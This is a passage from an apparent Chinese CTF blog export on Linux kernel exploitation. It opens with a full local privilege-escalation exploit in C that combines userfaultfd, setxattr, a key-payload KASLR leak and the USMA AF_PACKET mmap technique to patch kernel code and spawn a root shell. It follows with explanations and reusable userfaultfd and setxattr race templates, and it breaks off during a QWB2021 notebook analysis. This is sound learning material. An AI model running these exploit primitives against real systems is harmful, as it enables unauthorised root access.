s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));\n    if (s < 0) {\n        die(\"socket(AF_PACKET): %m\");\n    }\n\n    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,\n                               sizeof_priv, timeout);\n\n    struct sockaddr_ll sa;\n    memset(&sa, 0, sizeof(sa));\n    sa.sll_family = PF_PACKET;\n    sa.sll_protocol = htons(ETH_P_ALL);\n    sa.sll_ifindex = if_nametoindex(\"lo\");\n    sa.sll_hatype = 0;\n    sa.sll_pkttype = 0;\n    sa.sll_halen = 0;\n\n    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));\n    if (rv < 0) {\n        die(\"bind(AF_PACKET): %m\");\n    }\n\n    return s;\n}\n\nint pagealloc_pad(int count, int size) {\n    return packet_socket_setup(size, 2048, count, 0, 100);\n}\n\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;   \n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    \n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\nvoid* userfaultfd_sleep20_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    printf(\"[+] in usefaultfd handler, i will sleep 20s\\n\");   \n    sleep(20);\n    printf(\"[+] sleep done\\n\");\t\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, PAGE_SIZE);\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    // puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid* userfaultfd_sleep3_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    printf(\"[+] in usefaultfd handler, i will sleep 3s\\n\");   \n    sleep(3);\n    printf(\"[+] sleep done\\n\");\t\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, PAGE_SIZE);\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    // puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid seven_kmalloc(){\n    ioctl(fd_seven,0x5555,0);\n}\n\nvoid seven_kfree(){\n    ioctl(fd_seven,0x6666,0);\n}\n\nvoid* setxattr_thread(void* addr_arg){\n    setxattr(\"/exp\",\"bling\",addr_arg,0x200,0); \n    // syscall(__NR_setxattr, \"/exp\", \"bling\", addr_arg, 0x200, 0);\n    return 0;\n}\n\n\nint key_alloc(char* description, char* payload, int payload_len)\n{\n    return syscall(\n        __NR_add_key,\n        \"user\",\n        description,\n        payload,\n        payload_len,\n        KEY_SPEC_PROCESS_KEYRING\n    );\n}\n\nint key_read(int key_id, char *retbuf, int retbuf_len)\n{\n    return syscall(\n        __NR_keyctl,\n        KEYCTL_READ,\n        key_id,\n        retbuf,\n        retbuf_len\n    );\n}\n\nint key_revoke(int key_id)\n{\n    return syscall(\n        __NR_keyctl,\n        KEYCTL_REVOKE,\n        key_id,\n        0,\n        0,\n        0\n    );\n}\n\n\nint main(){\n    int packet_fds = 0;\n    int packet_fds1 = 0;\n    int i = 0;\n\n    pid_t pid = fork();\n    if(!pid){\n        init_namespace();\n        fd_seven = open(\"/dev/seven\",2);\n\n        addr = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n        RegisterUserfault(addr+0x1000, userfaultfd_sleep20_handler);\n\n        aaa = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n        RegisterUserfault(aaa+0x1000, userfaultfd_sleep3_handler);\n        for(int k = 0x150; k > 0x0; k = k-0x8){\n            *(uint64_t*)(aaa+0x1000-k) = 'd';\n        }\n        *(uint64_t*)(aaa+0x1000-0x150) = 0x11111111;\n        *(uint64_t*)(aaa+0x1000-0x148) = 0x22222222;\n        *(uint64_t*)(aaa+0x1000-0x140) = 0x1000;\n\n// malloc + free\n        seven_kmalloc();\n        seven_kfree();\n// malloc: user_key_payload\n        char* in_buf = malloc(0x100);\n        memset(in_buf,'a',0x100);\n        int fd_key = key_alloc(\"description1\",in_buf,0xF0);  \n// free\n        seven_kfree();\n// malloc: setxattr\n        pthread_t thr1;\n        pthread_create(&thr1, NULL, setxattr_thread, aaa+0x1000-0x150);         // kmalloc -> sleep(3) -> kfree\n        sleep(1);\n\n// leak\n        char *retbuf1 = malloc(0x1000);\n        memset(retbuf1, 0, 0x1000);\n        int qqq = key_read(fd_key,retbuf1,0x1000);\n        printf(\"[+]qqq: %d\\n\",qqq);\n        // hexdump(retbuf1,0x1000);\n\n        for(i = 0;i < 0x200; i++){\n            uint64_t temp_value = *(uint64_t*)(retbuf1+i*8);\n            if(((temp_value>>32) == 0xffffffff) && ((temp_value & 0xfff) == 0x280)){\n                kernel_base = temp_value - (crypto_larval_destroy - BZIMAGE_ADDR);\n                printf(\"[+] kernel_base is: 0x%lx\\n\",kernel_base);\n                break;\n            }\n        }\n\n        if(i == 0x200){\n            printf(\"failed leak, reboot and try again!\\n\");\n            exit(0);\n        }\n\n// free: user_key_payload\n        key_revoke(fd_key);\n        sleep(1);\n\n// malloc:  AF_PACKET\n        packet_fds = pagealloc_pad(33, 0x1000);\n        printf(\"page alloc done!\\n\");\n\n// free, malloc, control \n        sleep(1);                   // waiting pthread's kfree\n        for(int j = 0x150; j > 0x0; j = j-0x8){\n            // *(uint64_t*)(addr+0x1000-j) = 0xFFFFFFFF81078000 - BZIMAGE_ADDR + kernel_base;\n            *(uint64_t*)(addr+0x1000-j) = 0xFFFFFFFF81086000 - BZIMAGE_ADDR + kernel_base;\n        }\n        // *(uint64_t*)(addr+0x1000-0x150) = 0xFFFFFFFF81078000 - BZIMAGE_ADDR + kernel_base;\n        *(uint64_t*)(addr+0x1000-0x150) = 0xFFFFFFFF81086000 - BZIMAGE_ADDR + kernel_base;\n\n        pthread_t thr_sleep,thr_sleep2;\n        pthread_create(&thr_sleep, NULL, setxattr_thread, addr+0x1000-0x150);\n        sleep(1);\n        pthread_create(&thr_sleep2, NULL, setxattr_thread, addr+0x1000-0x150);\n        sleep(1);\n\n        char *page = (char *)mmap(NULL, PAGE_SIZE * 33,\n                                      PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds, 0);\n        printf(\"mmap done\\n\");\n        // hexdump(page, 0x1000);\n\n        // page[0x997] = 0x7;\n        page[0xfd8] = 0xeb;         // change if branch\n\n        pause();\n    }else{\n        sleep(8);\n        char buf[50]= {0};\n        printf(\"new\\n\");\n        setresuid(0, 0, 0);\n        printf(\"getuid: %d\\n\",getuid());\n        printf(\"geteuid: %d\\n\",geteuid());\n        int fd1 = open(\"/flag\",0);\n        printf(\"fd:%d\\n\",fd1);\n        read(fd1,buf,0x20);\n        printf(\"flag:%s\\n\",buf);\n        system(\"/bin/sh\");\n        // execl(\"/bin/sh\", \"sh\", NULL);\n    }\n    \n    pause();\n    return 0;\n}\n```\n\n有几个需要注意的点：\n\n- 部分socket操作不允许普通用户执行，因此由子进程调用init_namspace()切换空间，然后执行利用逻辑。而父进程等待子进程操作完成后，提权获得root shell即可。\n- 由于利用过程中对目标0x200堆块有多次malloc和free操作，要保证0x200堆块链不被破坏，后续才能稳定get shell。\n\n\n\n# 关于USMA\n\nUSMA用到了三个系统调用：\n\n- setsockopt\n- mmap\n- setresuid\n\n前两个搭配可以更改内核任意代码段逻辑。\n\n以setresuid为例，改掉`__sys_setresuid()`中if判断（或者改`ns_capable_setid()`的返回值，固定成1），使任意用户可以通过`setresuid(0,0,0)`将自己的uid改成0，即获得root权限。\n\n```c\nlong __sys_setresuid(uid_t ruid, uid_t euid, uid_t suid)\n{\n\t// ...\n\tif (!ns_capable_setid(old->user_ns, CAP_SETUID)) {\n\t\tif (ruid != (uid_t) -1        && !uid_eq(kruid, old->uid) &&\n\t\t    !uid_eq(kruid, old->euid) && !uid_eq(kruid, old->suid))\n\t\t\tgoto error;\n\t\tif (euid != (uid_t) -1        && !uid_eq(keuid, old->uid) &&\n\t\t    !uid_eq(keuid, old->euid) && !uid_eq(keuid, old->suid))\n\t\t\tgoto error;\n\t\tif (suid != (uid_t) -1        && !uid_eq(ksuid, old->uid) &&\n\t\t    !uid_eq(ksuid, old->euid) && !uid_eq(ksuid, old->suid))\n\t\t\tgoto error;\n\t}\n    // ...\n}\n```\n\n\n\n## 调用梳理\n\npacket_setsockopt： \n\n`entry_SYSCALL_64_after_hwframe()` -> `do_syscall_64()` -> `__x64_sys_setsockopt()` -> `__sys_setsockopt() `-> `packet_setsockopt()` -> `packet_set_ring()` -> `alloc_pg_vec()` -> 申请n个`struct pgv`结构体\n\n```c\nstruct pgv {\n\tchar *buffer;\n};\n```\n\n\n\npacket_mmap：\n\n`entry_SYSCALL_64_after_hwframe()` -> `do_syscall_64()` -> `_x64_sys_mmap()` -> `ksys_mmap_pgoff()` -> `vm_mmap_pgoff()` -> `do_mmap()` -> `mmap_region()` -> `call_mmap()` -> `sock_mmap()` -> `packet_mmap()` -> `vm_insert_page()` -> `validate_page_before_insert()` -> 将pgv中虚拟地址对应的物理页映射到用户态\n\n\n\n## 操作梳理\n\n`packet_setsockopt()`最终调用`alloc_pg_vec()`申请一段内核堆空间，大小是用户态可控的\n\n```c\nstatic struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)\n{\n\t// ...\n    // 根据用户态传入的block_nr，申请block_nr*8大小的内存\n\tpg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);\n\t// ...\n    \n\tfor (i = 0; i < block_nr; i++) {\n        // 从buddy allocator申请block_nr个block_size(用户态指定)大小的块\n\t\tpg_vec[i].buffer = alloc_one_pg_vec_page(order);\n\t\tif (unlikely(!pg_vec[i].buffer))\n\t\t\tgoto out_free_pgvec;\n\t}\n\t// ...\n}\n```\n\n\n\n用户态mmap的时候，可以一次性将block_nr个block全部mmap到用户空间，如`PAGE_SIZE * KMALLOC64_PAGE_CNT`\n\n```\n char *page = (char *)mmap(NULL, PAGE_SIZE * KMALLOC64_PAGE_CNT,\n               PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds[i], 0);\n```\n\n用户态mmap在该环境下最终对应到内核`packet_mmap()`函数，将`pg_vec`中的虚拟地址全部重新映射给用户态。\n\n```c\nstatic int packet_mmap(struct file *file, struct socket *sock,\n\t\tstruct vm_area_struct *vma)\n{\n    // ...\n\tsize = vma->vm_end - vma->vm_start;\n\tif (size != expected_size)\n\t\tgoto out;\n\n\tstart = vma->vm_start;\n\tfor (rb = &po->rx_ring; rb <= &po->tx_ring; rb++) {\n\t\tif (rb->pg_vec == NULL)\n\t\t\tcontinue;\n\n        // rb->pg_vec_len是setsockopt()时传入的block_nr\n\t\tfor (i = 0; i < rb->pg_vec_len; i++) {\n\t\t\tstruct page *page;\n            // 从alloc_pg_vec()申请的堆中，取出各block的虚拟地址\n\t\t\tvoid *kaddr = rb->pg_vec[i].buffer;\n\t\t\tint pg_num;\n\n            // setsockopt()时传入的block_size/PAGE_SIZE，得到rb->pg_vec_pages\n\t\t\tfor (pg_num = 0; pg_num < rb->pg_vec_pages; pg_num++) {\n                // 将虚拟地址转换成物理页面page\n\t\t\t\tpage = pgv_to_page(kaddr);\n                // 建立物理内存与用户地址空间的映射关系\n\t\t\t\terr = vm_insert_page(vma, start, page);\n\t\t\t\tif (unlikely(err))\n\t\t\t\t\tgoto out;\n\t\t\t\tstart += PAGE_SIZE;\n\t\t\t\tkaddr += PAGE_SIZE;\n\t\t\t}\n\t\t}\n\t}\n\t// ...\n}\n```\n\n\n\n\n\n# 参考资料\n\n[USMA:用户态映射攻击](https://vul.360.net/archives/391)\n\n[基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践](https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/)\n\n[kernel-exploit-factory/CVE-2022-27666/exploit/](https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2022-27666/exploit)\n\n[linux/unix下setuid/seteuid/setreuid/setresuid](https://blog.csdn.net/damotiansheng/article/details/39674115)\n","tags":["kernel pwn"],"categories":["CTF"]},{"title":"userfaultfd 与 setxattr 在条件竞争中的利用练习","url":"/2023/03/02/230302-userfaultfd-and-setxattr-exercises/","content":"\n\n\n\n\n通过两个 kernel ctf 题目来理解`userfaultfd`以及`setxattr`的用法吧！\n\n# 概念梳理\n\n## userfaultfd系统调用\n\nuserfaultfd是linux的一个系统调用（无libc封装函数），它的出现（Linux 4.3）给用户态提供了缺页处理的能力。userfaultfd系统调用返回给用户态进程的是一个用于处理page faults的文件描述符。\n\n[userfaultfd(2) - Linux manual page](https://man7.org/linux/man-pages/man2/userfaultfd.2.html)\n\n[ioctl_userfaultfd(2) — Linux manual page](https://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html)\n\n[SYSCALL_DEFINE1(userfaultfd, int, flags)](https://elixir.bootlin.com/linux/v5.15/source/fs/userfaultfd.c#L2062)\n\n[从内核到用户空间(1) — 用户态缺页处理机制 userfaultfd 的使用](http://blog.jcix.top/2018-10-01/userfaultfd_intro/)\n\n### 使用userfaultfd\n\n一个利用userfaultfd让用户态来处理缺页异常的例子（来自`man userfaultfd`）：\n\n1. 通过userfaultfd系统调用创建userfaultfd object\n\n   ```c\n   \tlong uffd;\n   \tuffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n   ```\n\n2. 用户态进程需要先通过UFFD_API这个ioctl命令，使能userfaultfd\n\n   ```c\n   \tstruct uffdio_api uffdio_api;\n   \tuffdio_api.api = UFFD_API;\n   \tuffdio_api.features = 0;\n   \tioctl(uffd, UFFDIO_API, &uffdio_api);\n   ```\n\n3. 用户态进程通过UFFDIO_REGISTER这个ioctl命令，注册设置内存地址范围\n\n   ```c\n       char *addr;  \n       struct uffdio_register uffdio_register;\n   \taddr = mmap(NULL, len, PROT_READ | PROT_WRITE,\n   \t            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n   \n   \tuffdio_register.range.start = (unsigned long) addr;\n   \tuffdio_register.range.len = len;\n   \tuffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;\n   \tioctl(uffd, UFFDIO_REGISTER, &uffdio_register;\n   ```\n\n4. 最后用户态进程可使用UFFDIO_COPY或UFFDIO_ZEROPAGE两个ioctl命令来处理缺页异常。\n\n   ```c\n   \ts = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);\n   \n   // fault_handler_thread()函数定义如下，梳理主要代码流程\n   static void *fault_handler_thread(void *arg){\n   // 1) 创建一个page，用于缺页处理\n        page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,\n                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n   // 2) 等待uffd事件到来\n        pollfd.fd = uffd;\n        pollfd.events = POLLIN;\n        poll(&pollfd, 1, -1);\n     \n   // 3) 从userfaultfd中读取事件信息，确认是否是缺页错误事件     \n        read(uffd, &msg, sizeof(msg));\n        if (msg.event != UFFD_EVENT_PAGEFAULT) {\n            fprintf(stderr, \"Unexpected event on userfaultfd\\n\");\n            exit(EXIT_FAILURE);\n        }\n   \n   // 4) 将准备好的数据页内容拷贝到userfaultfd注册的空间内\n        uffdio_copy.src = (unsigned long) page;\n        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address & ~(page_size - 1);\n        uffdio_copy.len = page_size;\n        uffdio_copy.mode = 0;\n        uffdio_copy.copy = 0;\n        ioctl(uffd, UFFDIO_COPY, &uffdio_copy) \n   }\n   ```\n\n   \n\n用户线程的处理过程是我们可控的，通过延长用户态处理时间，该系统调用可以帮助我们提高内核条件竞争成功的概率。\n\n**防护**\n\nuserfaultfd系统调用从linux4.3开始引入，刚开始的几个版本中，对该系统调用无任何限制，所有用户均可调用。\n\nlinux 5.2开始，在内核中增加了一个开关，通过`sysctl_unprivileged_userfaultfd`来控制是否允许用非特权用户使用userfaultfd功能（默认情况下设置为0，不允许非特权用户使用）。\n\n```c\n\tif (!sysctl_unprivileged_userfaultfd && !capable(CAP_SYS_PTRACE))\n\t\treturn -EPERM;\n```\n\nlinux 5.11开始，又增加了`UFFD_USER_MODE_ONLY`标志位，决定了userfaultfd是否仅处理用户空间的page fault。[Blocking userfaultfd() kernel-fault handling](https://lwn.net/Articles/819834/) 文章中指出，新版本内核中默认禁止非特权进程使用userfaultfd，非特权进程只能通过设置`sysctl_unprivileged_userfaultfd`从而安全地调用userfaultfd（只能处理用户态的缺页错误，启用`UFFD_USER_MODE_ONLY`标志着userfaultfd不允许在内核态使用）。\n\n```c\n\tif (!sysctl_unprivileged_userfaultfd &&\n\t    (flags & UFFD_USER_MODE_ONLY) == 0 &&\n\t    !capable(CAP_SYS_PTRACE)) {\n\t\tprintk_once(KERN_WARNING \"uffd: Set unprivileged_userfaultfd \"\n\t\t\t\"sysctl knob to 1 if kernel faults must be handled \"\n\t\t\t\"without obtaining CAP_SYS_PTRACE capability\\n\");\n\t\treturn -EPERM;\n\t}\n```\n\n那么，在做题过程中，如下两条命令中任何一条为1，大概率表明这个题可以使用userfaultfd。而真实系统上，还要确认`UFFD_USER_MODE_ONLY`没开。\n\n```bash\n# 查看内核是否支持userfaultd，出现`CONFIG_USERFAULTFD=y`表示支持\ngrep CONFIG_USERFAULTFD /boot/config-$(uname -r)\n# 查看非特权用户是否能调用userfaultfd，值为1时表示非特权用户可调用\nsysctl -a | grep unprivileged_userfaultfd\n```\n\n感谢chatgpt😝\n\n![Snipaste_2023-03-02_12-32-42](Snipaste_2023-03-02_12-32-42.png?size=600)\n\n可以通过编译下面这段代码，确认能否使用userfaultfd。（出现`[+] in usefaultfd handler, i will sleep 60s\\n\"`字符串打印，表明可以使用）\n\n```c\n// gcc test.c -lpthread -o test\n#define _GNU_SOURCE\n#include <inttypes.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <linux/userfaultfd.h>\n#include <pthread.h>\n#include <errno.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <signal.h>\n#include <poll.h>\n#include <string.h>\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <sys/ioctl.h>\n#include <poll.h>\n#include <ctype.h>\n#include <sys/timerfd.h>\n#include <sys/types.h>\n#include <sys/ipc.h>\n#include <sys/msg.h>\n#include <linux/keyctl.h>\n#include <sys/xattr.h>\n\n#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)\n\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n    //当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    //开一个线程，接收错误的信号，然后处理\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\nvoid* userfaultfd_leak_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    printf(\"[+] waiting poll\\n\");\n    nready = poll(&pollfd, 1, -1);\n    printf(\"[+] in usefaultfd handler, i will sleep 60s\\n\"); \n    sleep(60);\n\tprintf(\"[+] sleep done\\n\");\t\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n\nvoid* setxattr_thread(void* a){\n    printf(\"thread created!\\n\");\n    setxattr(\"/exp\",\"bling\",a,0x200,0);  \n    //char * temp = malloc(0x200);\n    //memcpy(temp,a,0x200);\n    //printf(\"end copy!\\n\");\n}\n\nint main(){\n\tchar *addr = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\tRegisterUserfault(addr+0x1000, userfaultfd_leak_handler);\n\t\n    pthread_t thr;\n    pthread_create(&thr, NULL, setxattr_thread, addr+0x1000-0x100);\n\t\n    pthread_exit(NULL);\n\treturn 0;\n}\n```\n\n\n\n\n\n### CTF利用模板\n\n[userfaultfd 的使用-ctfwiki](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/)\n\n```c\nvoid ErrExit(char* err_msg)\n{\n    puts(err_msg);\n    exit(-1);\n}\n\nvoid RegisterUserfault(void *fault_page,void *handler)\n{\n    pthread_t thr;\n    struct uffdio_api ua;\n    struct uffdio_register ur;\n    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n    ua.api = UFFD_API;\n    ua.features = 0;\n    if (ioctl(uffd, UFFDIO_API, &ua) == -1)\n        ErrExit(\"[-] ioctl-UFFDIO_API\");\n\n    ur.range.start = (unsigned long)fault_page;     //我们要监视的区域\n    ur.range.len   = PAGE_SIZE;\n    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;\n    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)    //注册缺页错误处理\n    //当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作\n        ErrExit(\"[-] ioctl-UFFDIO_REGISTER\");\n    //开一个线程，接收错误的信号，然后处理\n    int s = pthread_create(&thr, NULL,handler, (void*)uffd);\n    if (s!=0)\n        ErrExit(\"[-] pthread_create\");\n}\n\nvoid* userfaultfd_leak_handler(void* arg)\n{\n    struct uffd_msg msg;\n    unsigned long uffd = (unsigned long) arg;\n    struct pollfd pollfd;\n    int nready;\n    \n    pollfd.fd = uffd;\n    pollfd.events = POLLIN;\n    nready = poll(&pollfd, 1, -1);\n    sleep(30);\n    // pause();\t\t\t//根据实际情况在这里添加处理代码，或者直接暂停或sleep\n    if (nready != 1) ErrExit(\"[-] Wrong poll return val\");\n\n    nready = read(uffd, &msg, sizeof(msg));\n    if (nready <= 0) ErrExit(\"[-] msg err\");\n\n    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n    if (page == MAP_FAILED) ErrExit(\"[-] mmap err\");\n    memset(page, 0, sizeof(page));\n    \n    struct uffdio_copy uc;\n    uc.src = (unsigned long) page;\n    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);\n    uc.len = PAGE_SIZE;\n    uc.mode = 0;\n    uc.copy = 0;\n    ioctl(uffd, UFFDIO_COPY, &uc);\n    puts(\"[+] leak handler done\");\n    return NULL;\n}\n```\n\n使用方法：\n\n```c\nchar *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\nRegisterUserfault(addr, handler);\n```\n\n\n\n## setxattr系统调用\n\n[setxattr(2) — Linux manual page](https://man7.org/linux/man-pages/man2/setxattr.2.html)\n\n[SETXATTR - Linux手册页](https://www.onitroad.com/jc/linux/man-pages/linux/man2/fsetxattr.2.html)\n\n[Linux Kernel universal heap spray](https://duasynt.com/blog/linux-kernel-heap-spray)\n\n`setxattr`是一个linux系统调用，同时在libc中也有同名的封装函数。通过`setxattr()`可以给系统中inode（文件，目录，符号链接）设置扩展属性（name:value对）。使用示例：\n\n```c\nchar* value = \"someting...\"\nsetxattr(\"/exp\",\"bling\",value,0x20,0);\n```\n\n对应到内核调用路径：\n\n![image-20230301180427383](image-20230301180427383.png?size=600)\n\n内核`setxattr()`函数中的主要处理过程如下，根据用户态传入的size申请对应大小（0<size<65535）的内存空间，并将用户态数据拷贝到该空间中，退出时会释放该内存空间。\n\n```c\nstatic long\nsetxattr(struct user_namespace *mnt_userns, struct dentry *d,\n\t const char __user *name, const void __user *value, size_t size,\n\t int flags)\n{\n\t// ...\n\tif (size) {\n\t\tif (size > XATTR_SIZE_MAX)\t\t\t// size不能大于65535\n\t\t\treturn -E2BIG;\n\t\tkvalue = kvmalloc(size, GFP_KERNEL);\t\t// 为value申请size大小的内存空间\n\t\t// ...\n\t\tif (copy_from_user(kvalue, value, size)) {\t// 将用户态的value内容拷贝到内核态申请的空间中\n\t\t\terror = -EFAULT;\n\t\t\tgoto out;\n\t\t}\n\t\t// ...\n\t}\n\t// ...\nout:\n\tkvfree(kvalue);\t\t// 设置完成后，退出函数前释放掉申请的内存空间\n\n\treturn error;\n}\n```\n\n漏洞利用过程中有两种使用方法：\n\n1. 结合userfaultfd，跨页面拷贝时让进程停在`copy_from_user`处。对UAF堆，相比其他结构体，setxattr可覆盖前8字节内容\n2. 纯粹往堆上喷数据\n\n\n\n# 题目1 - 强网杯2021 notebook\n\n[QWB2021-notebook](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/#qwb2021-notebook)\n\n[从强网杯 2021 线上赛题目 notebook 中浅析 userfaultfd 在 kernel pwn 中的利用](https://www.anquanke.com/post/id/253835)\n\n[第五届强网杯线上赛冠军队 WriteUp - Pwn 篇](https://zhuanlan.zhihu.com/p/385645268)\n\n做这个题前，首先要了解读写锁的原理：\n\n- 当写锁被取走时，所有取锁操作被阻塞\n- 当读锁被取走时，取写锁的操作被阻塞\n\n## 分析\n\n题目附件：[QWB2021-notebook.zip](QWB2021-notebook.zip)\n\n先看`notebook.ko`的逻辑：\n\n- noteadd（0x100）：为notebook[idx]->note申请一片size大小的空间\n- notegift（0x64）：将notebook处存放的note和size信息（256个字节）全部拷贝给用户态（信息泄露 - 泄露堆地址）\n- notedel（0x200）：free掉notebook[idx]->note对应的空间，在size不为0的情况下，清空bss段上的内容\n- noteedit（0x300）：修改notebook[idx]->note和size，逻辑有问题导致size变任意大小，并申请任意大小的堆。（这里存在条件竞争，可导致UAF）\n- mynote_read：根据传入的idx，将notebook[idx]->note内容读出。有`_check_object_size()`检查，堆和大小匹配时才能正确读出，防止堆的越界读写。\n- 